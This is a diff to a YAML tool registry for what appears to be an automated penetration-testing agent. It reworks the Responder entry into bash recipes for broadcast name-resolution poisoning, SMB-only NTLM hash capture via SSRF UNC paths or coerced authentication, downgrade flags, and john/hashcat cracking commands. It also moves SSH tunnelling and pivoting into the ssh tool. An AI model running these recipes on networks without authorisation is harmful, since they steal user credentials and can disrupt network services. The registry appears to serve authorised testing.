@@ -1,5 +1,5 @@
 version: '2.0'
-updated_at: '2026-05-09T10:32:02Z'
+updated_at: '2026-05-10T21:27:10Z'
 tools:
   amass:
     name: amass
@@ -2014,9 +2014,11 @@ tools:
       memory_mb: 128
       cpu: 0.25
     see_also:
-    - tool: tunnel
-      reason: Use SSH-based tunneling (ssh -L, ssh -D) when SSH is available — simpler and doesn't require running a server
-        component
+    - tool: ssh
+      reason: Use `ssh` (kind:cli v3.0, May 2026) for SSH-based tunneling when SSH is available — its ControlMaster + tunnel-flag
+        patterns (-L forward, -D SOCKS, -R reverse) cover everything the legacy `tunnel` (kind:mcp) tool did, and don't require
+        a server component on the agent side. The legacy `tunnel` tool was retired May 2026; SSH-based tunneling lives in
+        `ssh` now. Use chisel only when SSH is blocked / unavailable and HTTP is open.
     - tool: nc
       reason: Use for raw reverse shell listeners (held-listener pipeline pattern), then tunnel the shell through chisel if
         needed. The legacy `netcat` (kind:mcp) tool was consolidated into `nc` (kind:cli v2.0, May 2026); search for either
@@ -8215,10 +8217,12 @@ tools:
     - tool: nuclei
       reason: nuclei has `cves/2018/CVE-2018-13379-fortinet.yaml` and similar templates that fingerprint vendor VPN appliances
         over HTTPS/SSL. Complementary to ike-scan's IKE-layer fingerprinting — different transport, often same target.
-    - tool: tunnel
-      reason: Once an IPsec VPN credential pair is recovered (group name + PSK), the tunnel tool can establish the actual
-        VPN connection (strongSwan / Libreswan) for follow-up internal recon. ike-scan only discovers / cracks; tunnel sets
-        up the live tunnel.
+    - tool: ssh
+      reason: Once IPsec VPN credentials are recovered AND a foothold established via SSH, the `ssh` tool's ControlMaster
+        + tunnel-flag patterns (-L / -D / -R) provide SOCKS / port-forward pivoting into the internal network. The legacy
+        `tunnel` (kind:mcp) tool was retired May 2026; its 5 methods (forward, socks, list, close, close_all) now live in
+        ssh kind:cli v3.0. For IPsec connection itself (strongSwan / Libreswan), invoke OS tooling via bash from inside an
+        SSH'd host — that flow is engagement-specific.
     target_extraction:
     - rule: last_non_flag_positional
       parse_as: raw
@@ -17181,25 +17185,42 @@ tools:
       purpose: Short alias for --help
   responder:
     name: responder
-    version: 3.2.2.0
-    description: 'LLMNR/NBT-NS/MDNS poisoning and NTLMv2 hash capture via Responder v3.2.2 (lgandx/Responder, Kali apt package
-      responder). Three methods: poison, analyze, capture_smb. Poisons broadcast name resolution protocols (LLMNR port 5355,
-      NBT-NS port 137, MDNS port 5353) to redirect authentication to rogue servers, capturing NTLMv2/NTLMv1 hashes in hashcat-compatible
-      format (mode 5600/5500). Runs 18 rogue servers simultaneously: SMB, HTTP, HTTPS, DNS, LDAP, FTP, POP, SMTP, IMAP, MSSQL,
-      RDP, WinRM, Kerberos, DCERPC, SNMP, MQTT, MYSQL, QUIC. Analyze mode (-A) passively observes traffic without poisoning.
-      capture_smb disables all poisoners and servers except SMB for SSRF-triggered hash capture. Duration-bounded execution
-      — runs for a fixed number of seconds then terminates and returns parsed results. Hash output parsed from SQLite database
-      (Responder.db) with fallback to log file parsing. Captured hashes are hashcat-ready: NTLMv2 → mode 5600, NTLMv1 → mode
-      5500, AS-REP → mode 7500. Requires privileged mode and host networking for raw socket access and broadcast/multicast
-      visibility.'
+    kind: cli
+    binary: responder
+    version: 3.2.2
+    description: 'LLMNR/NBT-NS/MDNS broadcast poisoning and NTLMv2 hash capture via Responder v3.2.2 (lgandx/Responder, Kali
+      apt package responder). Three operational modes via flag combinations: full poison (default, all 18 rogue servers +
+      LLMNR/NBT-NS/MDNS poisoners), passive analyze (-A flag, listen-only no responses), SMB-only capture (uses pre-baked
+      Responder-smb-only.conf for SSRF-triggered or coerced-auth capture). Captures NTLMv2/NTLMv1 hashes in hashcat-compatible
+      format (mode 5600/5500/7500) into /usr/share/responder/logs/<PROTO>-NTLMv*-<IP>.txt — agent copies these to /session/output/responder/
+      for persistence. Captured hashes also stored in Responder.db SQLite for structured queries. Time-bounded: requires `timeout
+      DURATION responder ...` wrapping. Container needs --privileged (NET_RAW + NET_ADMIN + privileged ports <1024) and --network=host
+      (broadcast/multicast visibility) — both handled automatically by plugin when requirements.privileged: true.'
     image: ghcr.io/silicon-works/mcp-tools-responder:latest
     image_size_mb: 250
+    idle_timeout_seconds: 600
+    max_runtime_seconds: 600
     timeout_seconds: 600
     capabilities:
     - hash_capture
     - llmnr_poisoning
     - nbtns_poisoning
     - mdns_poisoning
+    - smb_hash_capture
+    - wpad_poisoning
+    - dhcpv6_poisoning
+    - rdnss_poisoning
+    phases:
+    - exploitation
+    requirements:
+      network: true
+      privileged: true
+      privileged_reason: Requires raw sockets (NET_RAW) for LLMNR/NBT-NS/MDNS poisoning, network admin (NET_ADMIN) for multicast
+        group membership, and privileged ports (<1024) for rogue servers. Plugin defaults to --network=host so Layer 2 broadcast/multicast
+        traffic reaches the container.
+    resources:
+      memory_mb: 256
+      cpu: 0.5
     routing:
       use_for:
       - capture NTLMv2 hashes via LLMNR/NBT-NS/MDNS poisoning on the local network
@@ -17216,7 +17237,7 @@ tools:
       - poison IPv6 name resolution via DHCPv6 or RDNSS Router Advertisement on dual-stack networks
       - capture WebDAV authentication by returning STATUS_LOGON_FAILURE with -E (ErrorCode)
       never_use_for:
-      - NTLM relay attacks (use impacket.ntlmrelayx — Responder captures hashes, ntlmrelayx relays them)
+      - NTLM relay attacks (use impacket-ntlmrelayx — Responder captures hashes, ntlmrelayx relays them)
       - password cracking (use john or hashcat — Responder captures hashes, cracking tools crack them)
       - port scanning (use nmap — Responder is a listener, not a scanner)
       - credential spraying (use kerbrute — Responder is passive capture, not active authentication)
@@ -17234,224 +17255,197 @@ tools:
       - broadcast poisoning
       - SMB capture
       - forced authentication
-    phases:
-    - exploitation
-    requirements:
-      network: true
-      privileged: true
-      privileged_reason: Requires raw sockets (NET_RAW) for LLMNR/NBT-NS/MDNS poisoning, network admin (NET_ADMIN) for multicast
-        group membership, and privileged ports (<1024) for rogue servers. Must run with --network=host for Layer 2 broadcast/multicast
-        visibility.
-    resources:
-      memory_mb: 256
-      cpu: 0.5
+      - SSRF hash capture
+      - coerced auth capture
+      - PetitPotam capture
+      prefer_over: []
     see_also:
     - tool: john
-      reason: Crack captured NTLMv2 hashes (hashcat mode 5600) or NTLMv1 hashes (mode 5500) after Responder captures them
+      reason: Crack captured NTLMv2 hashes (hashcat mode 5600) or NTLMv1 hashes (mode 5500) after Responder captures them.
+        Hash files in /session/output/responder/logs/<PROTO>-NTLMv*.txt are line-oriented hashcat-format — feed directly to
+        john.
     - tool: impacket
-      reason: Use ntlmrelayx to relay captured authentication instead of cracking, or use secretsdump with cracked credentials
+      reason: 'Use impacket-ntlmrelayx (the binary inside the impacket kind:cli toolkit) to RELAY captured authentication
+        instead of cracking it offline. impacket-secretsdump uses cracked credentials. impacket-ntlmrelayx pairs naturally
+        with responder: poison broadcast → catch inbound auth → relay it to LDAPS/SMB/HTTP. See impacket gotchas for ntlmrelayx
+        daemon-binary stdin keep-alive.'
     - tool: netexec
-      reason: Validate cracked credentials across SMB, WinRM, LDAP, MSSQL after obtaining them via Responder
+      reason: Validate cracked credentials across SMB, WinRM, LDAP, MSSQL after obtaining them via Responder.
     - tool: hashcat
-      reason: Responder captures NTLMv2 hashes in hashcat mode 5600 format. Use hashcat for GPU-accelerated cracking of captured
-        hashes, especially with combinator or hybrid attacks.
+      reason: Responder captures NTLMv2 hashes in hashcat mode 5600 format. Use hashcat for GPU-accelerated cracking, especially
+        with combinator or hybrid attacks.
     - tool: bloodhound
-      reason: After obtaining valid credentials via hash cracking, collect AD relationship data for attack path analysis
-    methods:
-      poison:
-        description: 'Run Responder in full poisoning mode — responds to LLMNR (port 5355), NBT-NS (port 137), and MDNS (port
-          5353) broadcast queries with attacker''s IP, causing clients to authenticate to rogue servers. Runs for exactly
-          `duration` seconds then terminates. After termination, parses captured hashes from Responder''s SQLite database
-          (Responder.db) with fallback to log file parsing (logs/*-NTLMv*.txt). Captured hashes are in hashcat-compatible
-          format: NTLMv2 as `username::DOMAIN:challenge:ntproofstr:blob` (mode 5600), NTLMv1 as `username::DOMAIN:lmresponse:ntresponse:challenge`
-          (mode 5500). Copies hash files and DB to /session/output/responder/ for persistence. Supports WPAD poisoning (-w),
-          HTTP Basic auth downgrade (-b), LM hash downgrade (--lm), NTLMv1 downgrade (--disable-ess), DHCPv4 poisoning (-d),
-          DHCPv6 poisoning (--dhcpv6), RDNSS Router Advertisement poisoning (--rdnss), forced proxy authentication (-P), custom
-          external IPv4 (-e) and IPv6 (-6), custom TTL for poisoned answers (-t), and WebDAV auth capture via STATUS_LOGON_FAILURE
-          (-E). Interface auto-detected via `ip -j addr` if not specified.'
-        when_to_use: (1) After gaining access to an internal network segment (via VPN, pivot, or initial foothold) — poison
-          LLMNR/NBT-NS to capture credentials from Windows clients resolving non-existent hostnames. (2) When a Windows client
-          tries to resolve a hostname that DNS doesn't know — LLMNR/NBT-NS fallback broadcasts the query, and Responder answers
-          with attacker IP. (3) To capture domain user NTLMv2 hashes for offline cracking with john or hashcat. (4) Combined
-          with WPAD poisoning (-w) to capture browser proxy authentication from all clients on the segment. (5) Use --disable-ess
-          to force NTLMv1 downgrade for easier cracking (hashcat mode 5500 is faster than 5600). (6) After capturing hashes,
-          crack with john/hashcat, then use credentials with bloodhound, netexec, or impacket for further AD enumeration.
-        required_ports: []
-        params:
-          interface:
-            type: string
-            description: Network interface to listen on (e.g., 'eth0', 'tun0'). If omitted, auto-detects the first non-loopback
-              interface with an IPv4 address. Use the interface on the target network segment.
-          duration:
-            type: integer
-            required: true
-            description: How long to run Responder in seconds. Minimum 5 seconds. Use 60-300s for network poisoning (need
-              time for clients to make broadcast queries). Use 15-30s for SSRF capture where the trigger is immediate.
-          verbose:
-            type: boolean
-            default: true
-            description: Enable verbose output (-v). Shows poisoning activity and captured hash details.
-          wpad:
-            type: boolean
-            default: false
-            description: Start rogue WPAD proxy server (-w). Captures HTTP proxy authentication from browsers that auto-detect
-              proxy settings.
-          force_wpad_auth:
-            type: boolean
-            default: false
-            description: Force NTLM/Basic auth on wpad.dat retrieval (-F). More aggressive — may show authentication prompt
-              to users.
-          basic_auth:
-            type: boolean
-            default: false
-            description: Return HTTP Basic auth instead of NTLM (-b). Captures cleartext passwords instead of hashes. Easier
-              to use but users see a login prompt.
-          lm_downgrade:
-            type: boolean
-            default: false
-            description: Force LM hashing downgrade (--lm). Produces weaker hashes that crack faster but only old Windows
-              clients (XP/2003) support this.
-          disable_ess:
-            type: boolean
-            default: false
-            description: Disable Extended Session Security (--disable-ess). Forces NTLMv1 downgrade — hashcat mode 5500 cracks
-              much faster than NTLMv2 mode 5600.
-          dhcp:
-            type: boolean
-            default: false
-            description: 'Enable DHCPv4 poisoning with WPAD injection (-d). WARNING: may disrupt DHCP on the network segment.'
-          external_ip:
-            type: string
-            description: Custom IPv4 address to poison responses with (-e). Use when Responder runs on a different host than
-              the one clients should connect to. Defaults to the listening interface's IP.
-          external_ip6:
-            type: string
-            description: Custom IPv6 address to poison responses with (-6). Use for IPv6-enabled networks when Responder should
-              direct authentication to a different IPv6 address.
-          proxy_auth:
-            type: boolean
-            default: false
-            description: Force NTLM/Basic proxy authentication on all HTTP requests (-P). Highly effective — forces clients
-              to authenticate to the rogue proxy. Cannot be combined with wpad (-w).
-          dhcpv6:
-            type: boolean
-            default: false
-            description: Enable DHCPv6 poisoning (--dhcpv6). Responds to DHCPv6 Solicit messages with the attacker's DNS server.
-              Effective on dual-stack networks where IPv6 is autoconfigured.
-          rdnss:
-            type: boolean
-            default: false
-            description: Enable Router Advertisement RDNSS poisoning (--rdnss). Injects attacker IP as recursive DNS server
-              via IPv6 Router Advertisements. Effective on networks with IPv6 enabled.
-          error_code:
-            type: boolean
-            default: false
-            description: Return STATUS_LOGON_FAILURE for authentication requests (-E). Forces WebDAV clients to re-authenticate,
-              enabling WebDAV NTLMv2 hash capture. Used when targeting WebDAV-enabled clients.
-          ttl:
-            type: integer
-            description: Custom TTL (time-to-live) for poisoned answers (-t). Controls how long clients cache the poisoned
-              response. Lower values mean clients re-query sooner; higher values persist longer.
-        returns:
-          captured_hashes:
-            type: array
-            description: 'Array of captured hash objects. Each has: timestamp, module (SMB/HTTP/LDAP/etc.), hash_type (NTLMv2/NTLMv1/ClearText),
-              client_ip, hostname, username, hash (hashcat-compatible full hash string). Cleartext entries also have ''cleartext''
-              field. Empty if no authentication was captured during the duration.'
-          hash_count:
-            type: integer
-            description: Number of unique hashes captured. Zero on quiet networks.
-          interface_used:
-            type: string
-            description: Network interface that was used (specified or auto-detected).
-          duration_seconds:
-            type: integer
-            description: Actual duration Responder ran for.
-          copied_files:
-            type: array
-            description: Paths of hash files, logs, and DB copied to /session/output/responder/ for persistence.
-      analyze:
-        description: Passive analysis mode (-A flag) — Responder listens for LLMNR/NBT-NS/MDNS broadcast queries on the network
-          but does NOT respond to them and does NOT poison. This is safe reconnaissance that identifies what hostnames clients
-          are trying to resolve, which protocols are active, and which clients are making requests. Output logged to Analyzer-Session.log.
-          No rogue servers are started. No hashes are captured.
-        when_to_use: (1) First step on an internal network — assess broadcast protocol activity before deciding whether to
-          poison. (2) When you need to understand the attack surface without triggering any alerts. (3) To identify which
-          hostnames are being queried (potential poisoning targets). (4) When the engagement rules prohibit active poisoning
-          but allow passive monitoring.
-        required_ports: []
-        params:
-          interface:
-            type: string
-            description: Network interface to listen on. Auto-detected if omitted.
-          duration:
-            type: integer
-            required: true
-            description: How long to monitor in seconds. Use 30-120s for a quick assessment.
-          verbose:
-            type: boolean
-            default: true
-            description: Enable verbose output.
-        returns:
-          detected_protocols:
-            type: array
-            description: Lines from Analyzer-Session.log showing observed broadcast protocol activity. Each line contains
-              timestamp, protocol type, queried hostname, and source IP.
-          detection_count:
-            type: integer
-            description: Number of protocol events detected.
-          interface_used:
-            type: string
-            description: Network interface that was monitored.
-          duration_seconds:
-            type: integer
-            description: Duration of the monitoring period.
-      capture_smb:
-        description: 'SMB-only hash capture mode — disables ALL poisoners (LLMNR, NBT-NS, MDNS) and ALL rogue servers except
-          SMB. Only the SMB server (port 445) listens for incoming authentication. Designed for SSRF-triggered authentication
-          capture: trigger a server-side request to \\ATTACKER_IP\share from a web app, file inclusion, or other vulnerability,
-          and Responder''s SMB server captures the NTLMv2 hash. Also used for coerced authentication attacks (PetitPotam,
-          PrinterBug, DFSCoerce) where the target machine is forced to authenticate to the attacker''s SMB server. Modifies
-          Responder.conf before execution to disable all protocols except SMB.'
-        when_to_use: (1) When you have an SSRF vulnerability that allows UNC path injection (\\attacker\share) — set up capture_smb
-          first, then trigger the SSRF. (2) When using PetitPotam, PrinterBug, or DFSCoerce to coerce machine authentication
-          — run capture_smb to catch the NTLMv2 hash. (3) When you only need SMB authentication capture and want to avoid
-          binding to other ports (prevents port conflicts and reduces noise). (4) Safer than full poison mode because no broadcast
-          poisoning occurs.
-        required_ports: []
-        params:
-          interface:
-            type: string
-            description: Network interface to listen on. Auto-detected if omitted.
-          duration:
-            type: integer
-            required: true
-            description: How long to listen in seconds. Use 15-30s for SSRF capture (trigger should be immediate). Use 60s+
-              if waiting for coerced authentication.
-          verbose:
-            type: boolean
-            default: true
-            description: Enable verbose output.
-        returns:
-          captured_hashes:
-            type: array
-            description: Array of captured SMB hash objects (same format as poison method). Only SMB hashes since other protocols
-              are disabled.
-          hash_count:
-            type: integer
-            description: Number of SMB hashes captured.
-          interface_used:
-            type: string
-            description: Network interface used.
-          duration_seconds:
-            type: integer
-            description: Duration of the capture period.
-          smb_only:
-            type: boolean
-            description: Always true for this method — confirms only SMB was enabled.
-          copied_files:
-            type: array
-            description: Paths of hash files copied to /session/output/responder/.
+      reason: After obtaining valid credentials via hash cracking, collect AD relationship data for attack path analysis.
+    target_extraction: []
+    reject_flags: []
+    reject_flags_reason: responder takes no remote-target argument — it's a local listener. The agent passes -I <interface>
+      (the local NIC to bind), no target host. No reject_flags apply.
+    usage_patterns:
+    - name: Pattern R1 — full poisoning mode (replaces method 'poison')
+      binary: bash
+      command: -c 'mkdir -p /session/output/responder && timeout <duration> responder -I <interface> -v > /session/output/responder/stdout.log
+        2>&1; cp -r /usr/share/responder/logs /session/output/responder/ 2>/dev/null; cp /usr/share/responder/Responder.db
+        /session/output/responder/ 2>/dev/null; ls /session/output/responder/logs/*-NTLMv*.txt 2>/dev/null'
+      when: 'Run Responder in full poison mode for <duration> seconds (recommend 60-300 for network poisoning, 15-30 for SSRF
+        capture). Captures hashes to hashcat-format files in /session/output/responder/logs/. After timeout, the trailing
+        `ls` lists captured hash files for the agent to Read. For interface auto-detection (instead of hardcoded -I), see
+        Pattern R-helper below. Add additional flags as needed: -w (WPAD proxy), -F (force WPAD auth), -b (HTTP Basic downgrade),
+        -d (DHCPv4 — disrupts segment), --lm (LM downgrade), --disable-ess (NTLMv1 force), -P (proxy auth), --dhcpv6, --rdnss,
+        -E (WebDAV STATUS_LOGON_FAILURE), -e <ip> (custom external v4), -6 <ip> (custom external v6), -t <ttl> (custom TTL).'
+    - name: Pattern R2 — passive analyze mode (replaces method 'analyze')
+      binary: bash
+      command: -c 'mkdir -p /session/output/responder && timeout <duration> responder -I <interface> -A -v > /session/output/responder/stdout.log
+        2>&1; cp /usr/share/responder/logs/Analyzer-Session.log /session/output/responder/ 2>/dev/null'
+      when: 'Listen-only mode: responder observes LLMNR/NBT-NS/MDNS broadcasts but does NOT respond and does NOT start rogue
+        servers. -A is the analyze flag. No hashes captured. Output to /session/output/responder/Analyzer-Session.log shows
+        what hostnames clients are querying — useful for first-step reconnaissance to decide whether poisoning is worthwhile,
+        or when engagement rules prohibit active poisoning.'
+    - name: Pattern R3 — SMB-only capture (replaces method 'capture_smb')
+      binary: bash
+      command: -c 'mkdir -p /session/output/responder && cp /usr/share/responder/Responder-smb-only.conf /usr/share/responder/Responder.conf
+        && timeout <duration> responder -I <interface> -v > /session/output/responder/stdout.log 2>&1; cp -r /usr/share/responder/logs
+        /session/output/responder/ 2>/dev/null; cp /usr/share/responder/Responder.db /session/output/responder/ 2>/dev/null;
+        cp /usr/share/responder/Responder.conf.bak /usr/share/responder/Responder.conf 2>/dev/null'
+      when: 'SMB-only mode: all poisoners (LLMNR/NBT-NS/MDNS) and rogue servers (HTTP/HTTPS/DNS/LDAP/etc.) DISABLED — only
+        the SMB server (port 445) listens. Used for SSRF-triggered hash capture (\\\\attacker_ip\\share UNC injection in a
+        vulnerable web app) and coerced-auth attacks (PetitPotam, PrinterBug, DFSCoerce — coerce target machine to authenticate
+        to attacker''s SMB). Pre-baked Responder-smb-only.conf is in the image (built via Dockerfile RUN sed). The recipe
+        swaps it in, runs responder, then restores Responder.conf.bak. Per-container isolation — concurrent capture_smb in
+        two containers does not race. <duration>: 15-30s for SSRF, 60s+ for coerced auth.'
+    - name: Pattern R-helper — auto-detect interface via ip -j addr
+      binary: bash
+      command: '-c ''IFACE=$(ip -j addr | python3 -c "import json,sys; ifaces=[i for i in json.load(sys.stdin) if i[\"ifname\"]!=\"lo\"
+        and any(a.get(\"family\")==\"inet\" for a in i.get(\"addr_info\",[]))]; print(ifaces[0][\"ifname\"] if ifaces else
+        \"\")"); echo "selected: $IFACE"'''
+      when: Quick helper to pick the right interface when the agent doesn't know one to pass to -I. Returns the first non-loopback
+        interface with an IPv4 address. tun0 is the typical VPN interface for HTB / lab engagements. For an explicit choice,
+        hardcode (-I tun0). Use this helper if the agent isn't sure.
+    - name: Pattern R-cracking — feed captured NTLMv2 to john
+      binary: bash
+      command: -c 'cat /session/output/responder/logs/*-NTLMv2-*.txt 2>/dev/null | tee /session/output/responder/all-ntlmv2-hashes.txt;
+        ls /session/output/responder/logs/'
+      when: 'After Pattern R1 / R3 captures hashes, this concatenates all NTLMv2 hashes into a single file the agent feeds
+        to john (mode 5600) or hashcat. Format: `username::DOMAIN:challenge:ntproofstr:blob` — one per line. john recipe:
+        `john --format=netntlmv2 --wordlist=/path/to/rockyou.txt /session/output/responder/all-ntlmv2-hashes.txt`. hashcat
+        recipe: `hashcat -m 5600 /session/output/responder/all-ntlmv2-hashes.txt /path/to/rockyou.txt`.'
+    output_formats:
+    - flag: ''
+      format: text
+      preferred: true
+      notes: 'Default: hash files written under /usr/share/responder/logs/ as hashcat-compatible text. Agent copies to /session/output/responder/
+        via the recipe''s trailing cp commands.'
+    - flag: (SQLite)
+      format: sqlite_db
+      preferred: false
+      notes: 'Responder.db schema: table ''responder'' with columns timestamp, module, type, client, hostname, user, cleartext,
+        hash, fullhash. Query via sqlite3 CLI: `sqlite3 /session/output/responder/Responder.db "SELECT * FROM responder"`.'
+    common_options:
+      duration:
+      - '<duration>: passed to outer `timeout` wrapper. Recommend 60-300s for network poisoning, 15-30s for SSRF, 60s+ for
+        coerced auth. Cap at 540 (max_runtime_seconds 600 leaves 60s for cleanup/file-copy).'
+      interface:
+      - '-I <iface>: required. Network interface to bind. Use Pattern R-helper if unsure. tun0 is typical for HTB / lab engagements.'
+      poisoning:
+      - '-A: passive analyze (no responses, no servers — Pattern R2 default)'
+      - '-w: enable rogue WPAD proxy server'
+      - '-F: force NTLM/Basic auth on wpad.dat retrieval (more aggressive)'
+      - '-b: HTTP Basic auth downgrade (captures cleartext)'
+      - '--lm: LM hash downgrade (faster cracking, only old Windows clients)'
+      - '--disable-ess: NTLMv1 downgrade (hashcat 5500 cracks faster than 5600)'
+      - '-d: DHCPv4 poisoning + WPAD injection (disruptive — may break DHCP for the segment)'
+      - '--dhcpv6: DHCPv6 poisoning'
+      - '--rdnss: IPv6 Router Advertisement RDNSS poisoning'
+      - '-P: force NTLM/Basic auth on all HTTP requests (proxy auth) — incompatible with -w'
+      - '-E: WebDAV STATUS_LOGON_FAILURE (forces re-auth, captures WebDAV NTLMv2)'
+      network:
+      - '-e <ipv4>: custom external IPv4 to poison responses with (default: -I interface IP)'
+      - '-6 <ipv6>: custom external IPv6'
+      - '-t <ttl>: custom TTL for poisoned answers'
+      output:
+      - '-v: verbose (recommended — see poisoning activity)'
+      - 'Note: ALL output also lands in /usr/share/responder/logs/ regardless of -v'
+    gotchas:
+    - TIME-BOUNDED DAEMON. responder runs FOREVER until killed. Every invocation MUST be wrapped with `timeout <duration>`
+      outside the responder argv. Cap at 540s (max_runtime_seconds 600 leaves 60s for cleanup/cp). Without timeout, container
+      hits max_runtime hard kill and the trailing cp commands never run — meaning hash files stay in /usr/share/responder/logs/
+      inside the container instead of /session/output/responder/.
+    - 'PRIVILEGED + HOST NETWORK auto-handled. tool.yaml has `requirements.privileged: true` so plugin adds --privileged automatically
+      (NET_RAW + NET_ADMIN + <1024 ports). Plugin defaults to --network=host so broadcast/multicast traffic reaches the container.
+      NO manual flag passing needed at the cli_in_container level — just invoke the binary.'
+    - 'HASH FILE LOCATIONS — captured hashes land in /usr/share/responder/logs/<PROTO>-NTLMv2-<IP>.txt (line-oriented hashcat
+      format). The recipe''s trailing `cp -r /usr/share/responder/logs /session/output/responder/` copies them to the persistent
+      /session volume. Agent reads via `cat /session/output/responder/logs/*-NTLMv*.txt` or via the registry''s R-cracking
+      pattern. Format: NTLMv2 = mode 5600, NTLMv1 = mode 5500, AS-REP (legacy) = mode 7500.'
+    - RESPONDER.DB STRUCTURED ACCESS — captured hashes also stored in /usr/share/responder/Responder.db SQLite. After cp to
+      /session/output/responder/Responder.db, query via `sqlite3 /session/output/responder/Responder.db "SELECT timestamp,
+      module, type, client, hostname, user, cleartext, fullhash FROM responder"`. Useful for filtering by module (SMB only?
+      HTTP only?) or by client IP. The hash files are simpler for cracking (hashcat-ready); the DB is better for structured
+      queries (which client at what time).
+    - 'INTERFACE AUTODETECT recipe (replaces wrapper''s auto-detect logic): `IFACE=$(ip -j addr | python3 -c ''import json,sys;
+      ifaces=[i for i in json.load(sys.stdin) if i["ifname"]!="lo" and any(a.get("family")=="inet" for a in i.get("addr_info",[]))];
+      print(ifaces[0]["ifname"] if ifaces else "")'')`. tun0 is the typical VPN interface for HTB / lab engagements. For an
+      explicit choice (recommended for clarity), pass `-I tun0` directly in the recipe.'
+    - 'CAPTURE_SMB CONF SWAP — Pattern R3 swaps /usr/share/responder/Responder.conf for the pre-baked Responder-smb-only.conf
+      (poisoners + non-SMB servers all disabled), then restores from Responder.conf.bak after the run. Both files baked into
+      the image at build time (Dockerfile RUN sed). Per-container isolation: concurrent Pattern R3 calls in two containers
+      each have their own /usr/share/responder/Responder.conf — no race. If you need to verify the swap worked, the recipe
+      could include a pre-flight `grep ''^SMB = '' /usr/share/responder/Responder.conf` (should print `SMB = On` while everything
+      else is `Off`).'
+    - 'OUTPUT FORMAT in NTLMv2 hash files: `username::DOMAIN:challenge:ntproofstr:blob`. NTLMv1 format: `username::DOMAIN:lmresponse:ntresponse:challenge`.
+      Cleartext (when -b HTTP Basic) format: lines `[!] [HTTP] Cleartext Client : <ip>` followed by `User : ...` / `Pass :
+      ...` on subsequent lines. Agent identifies by which file (`*-NTLMv2-*.txt` vs `*-NTLMv1-*.txt` vs `*-Cleartext-*.txt`).'
+    - INCOMPATIBLE FLAG COMBOS — `-w` (WPAD proxy) and `-P` (force proxy auth) are mutually exclusive. `-d` (DHCPv4 poisoning)
+      is DISRUPTIVE — may break DHCP on the entire network segment if the responder host wins the DHCP race. Use sparingly
+      and only with explicit engagement scope authorization. `--lm` and `--disable-ess` are downgrade attacks that produce
+      weaker hashes — useful when cracking budget is limited but no functional difference for capture rate.
+    - 'RESPONDER.CONF VERSION SKEW — Kali''s responder package may upgrade between image rebuilds, and Responder.conf format
+      may change. The Dockerfile''s sed-based modification of Responder-smb-only.conf assumes the canonical line shape `^<Service>
+      = On`. If responder upgrades change this format, the smb-only conf may not correctly disable services. SAFETY: Pattern
+      R3 always restores from Responder.conf.bak (also pre-baked at build time), so worst case is the SMB-only mode degrades
+      to full poison mode (logs more services than intended) — not silent failure. Verify with `grep ''= On'' /usr/share/responder/Responder-smb-only.conf`
+      should show ONLY `SMB = On`.'
+    - NO SUBAGENT REUSE — responder spawns its own SMB/HTTP/etc. listener processes inside the container. Running TWO responder
+      instances in the same container would race on those ports; cli_in_container always spawns a fresh container per call
+      so this is structurally impossible. Concurrent responder calls run in separate containers with separate /usr/share/responder/
+      filesystems.
+    - 'MID-FLIGHT PEEK — while a responder is running (one tool-runner spawn blocked on the timeout), a SEPARATE tool-runner
+      spawn can read partial captures by `cat /session/output/responder/logs/*-NTLMv*.txt` IF the recipe''s trailing `cp`
+      has been reached. BUT: the `cp` only runs AFTER `timeout` returns. To get genuine mid-flight visibility, use `tee` in
+      the recipe: e.g., wrap with `tee /session/output/responder/live.log` to mirror stdout to disk while responder runs.
+      Default recipe captures only post-timeout.'
+    failure_signatures:
+    - signal: Permission denied
+      layer: permission
+      remediation: 'Container missing --privileged or --network=host. Verify tool.yaml has `requirements.privileged: true`
+        (plugin auto-adds --privileged). For host networking, plugin defaults to --network=host (manager.ts:382) — no override
+        should be needed. If still failing, check whether HEADED=1 environment is forcing different network mode.'
+    - signal: Address already in use
+      layer: tcp
+      remediation: 'Port conflict — another process already bound the port responder wants. Common: SMB (445), HTTP (80),
+        HTTPS (443), DNS (53), LDAP (389). With --network=host, responder shares the host''s port namespace — host''s own
+        services may collide. Either stop conflicting host service, or use Pattern R3 (SMB-only) to bind only port 445.'
+    - signal: Could not detect interface
+      layer: network_config
+      remediation: 'Auto-detect failed (-I not specified, no non-loopback IPv4 interface). Pass -I explicitly. For HTB / lab:
+        -I tun0. Run Pattern R-helper to enumerate available interfaces.'
+    - signal: Sniffer didn't return
+      layer: kernel_caps
+      remediation: Raw socket capability missing (NET_RAW). Container needs --privileged. Verify with `capsh --print` inside
+        container — should show cap_net_raw.
+    - signal: Settings file is missing
+      layer: image_corruption
+      remediation: 'Responder.conf missing from /usr/share/responder/. Image rebuild needed. If using Pattern R3 mid-execution:
+        the swap happened but the conf was rolled back without backup. Restore from Responder.conf.bak via `cp /usr/share/responder/Responder.conf.bak
+        /usr/share/responder/Responder.conf`.'
+    help_commands:
+    - name: responder — help
+      binary: responder
+      command: --help
+      when: Print responder's full flag list. target=null.
+    - name: responder — version
+      binary: responder
+      command: --version
+      when: Print Responder version. target=null.
   s3scanner:
     name: s3scanner
     kind: cli
@@ -20232,7 +20226,7 @@ tools:
   ssh:
     name: ssh
     kind: cli
-    version: '2.0'
+    version: '3.0'
     description: "OpenSSH 10.x client + sshpass 1.10 for one-shot remote operations against a host where you already have\
       \ credentials. Three sub-binaries:\n\n  ssh      — execute a single remote command, with optional key or\n         \
       \    password auth. PTY suppressed via -T for clean stdout\n             capture; -o StrictHostKeyChecking=no /\n  \
@@ -20292,9 +20286,11 @@ tools:
       - post-exploitation enumeration with multiple commands against same host
       - SFTP/SCP file transfer over an existing persistent SSH session
       - run SSH commands across multiple concurrent tool-runner spawns reusing one auth
+      - open SSH local-port-forward tunnel (-L) — access a service on remote SSH host's localhost
+      - create SSH dynamic SOCKS5 proxy (-D) for pivoting through SSH host's network
+      - open SSH remote-port-forward (-R) for callbacks from internal hosts to agent
       never_use_for:
       - SSH brute-force — use hydra ssh:// or netexec ssh
-      - SSH tunneling / SOCKS proxy / port forwarding — use the tunnel (kind:mcp) tool
       - SSH-based key cracking — use john's ssh2john + john / hashcat
       - initial port discovery — use nmap
       - TTY-required interactive tools (vi, less, htop) — kind:cli has no TTY (use ControlMaster + RequestTTY=force as a workaround
@@ -20325,18 +20321,32 @@ tools:
       - multiplex SSH
       - ssh socket
       - session reuse
+      - ssh tunnel
+      - ssh -L
+      - ssh -D
+      - ssh -R
+      - port forward
+      - local port forward
+      - remote port forward
+      - SOCKS proxy
+      - SOCKS5
+      - pivot via SSH
+      - tunnel
+      - ssh socks
       prefer_over:
       - shell-session
+      - tunnel
     see_also:
     - tool: nc
